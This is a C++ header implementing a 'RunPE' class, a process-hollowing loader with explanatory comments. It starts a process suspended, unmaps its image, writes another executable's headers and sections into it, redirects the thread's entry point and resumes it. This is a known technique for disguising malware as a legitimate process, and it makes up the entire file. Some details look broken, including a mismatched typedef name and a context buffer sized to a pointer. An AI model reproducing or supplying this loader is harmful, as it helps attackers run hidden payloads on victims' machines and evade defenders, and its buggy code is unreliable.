//it launches new process as suspended and write to the memory of this process
//applicaiton code to execute
//next we activate this process and  run the program

//reduces compilaction time
#pragma once
#include "stdafx.h"
#include<Windows.h>

//NtUnampViewOfSection is used to unmap/free  a view of section from virtual address
//second parameter- pointer to virtual addres of view to unmap/free
typedef LONG(WINAPI*NtUmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress));


class RunPE
{

public:
	RunPE(void)
	{


	}
	LPVOID FileToMem(LPCSTR szFileName)
	{

		HANDLE hFile;
		DWORD dwRead;
		DWORD dwSize;
		LPVOID pBuffer = NULL;

		hFile = CreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, NULL, NULL);
		if (hFile)
		{
			dwSize = GetFileSize(hFile, NULL);

			if (dwSize > 0)
			{
				//VirtuallAlloc -allocates memeory 
				//first parameter- starting point
				//second- size to allocate
				//third-what type i want to allocate
				//fourh-protection measures
				pBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);

				if (pBuffer)
				{
					//second-the number of bytes to move pointer ( in low order  32 bits field) 
					//third- the number of bytes to move pointer( in high order 32 bitd fiels)
					//fourth-starting postion of pointer
					SetFilePointer(hFile,NULL,NULL,FILE_BEGIN);
					ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);

				}

				CloseHandle(hFile);
			}
			return pBuffer;
		}



	}
	void Execfile(LPSTR szFileName, LPVOID pFile)
	{
		//represents PE header format
		PIMAGE_NT_HEADERS INH;


		//it allows API  has access to unmanaged  portion of Microsft  DirectX API
		PIMAGE_DOS_HEADER  IDH;

		//represents section header format
		PIMAGE_SECTION_HEADER ISH;

		PROCESS_INFORMATION PI;

		STARTUPINFOA SI;

		PCONTEXT CTX;

		PDWORD dwImageBase;

		NtUnmapViewOfSection xNtUnmapViewOfSection;

		LPVOID pImageBase;

		int Count;

		IDH = PIMAGE_DOS_HEADER(pFile);

		if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
		{
			INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
			if (INH->Signature == IMAGE_NT_SIGNATURE)
			{
				//fills destination with zeros
				RtlZeroMemory(&SI, sizeof(SI));
				RtlZeroMemory(&PI, sizeof(PI));

				if (CreateProcessA(szFileName,NULL , NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
				{
					CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
					CTX->ContextFlags = CONTEXT_FULL;

					//second-pointer to the context
					if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
					{
						//handle
						//pointer to base address
						//what you want ot read
						//number of bytes to read
						//read bytes
						ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);


						if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
						{
							xNtUnmapViewOfSection = NtUmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
							xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));


                              }
						//allocate space in the memory of another process
						pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

						if(pImageBase)
						{ 
							//first-handle to process
							//pointer to base address
							//what you want to write
							//number of bytes to write
							//number of written bytes
							WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfImage, NULL);

							for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
							{
								ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
								WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
							}
							WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);

							CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
							SetThreadContext(PI.hThread, LPCONTEXT(CTX));
							ResumeThread(PI.hThread);

						
						
						}

					}

			}
			}
		}
		VirtualFree(pFile, 0, MEM_RELEASE);
	}
	~RunPE(void)
	{


	}
};
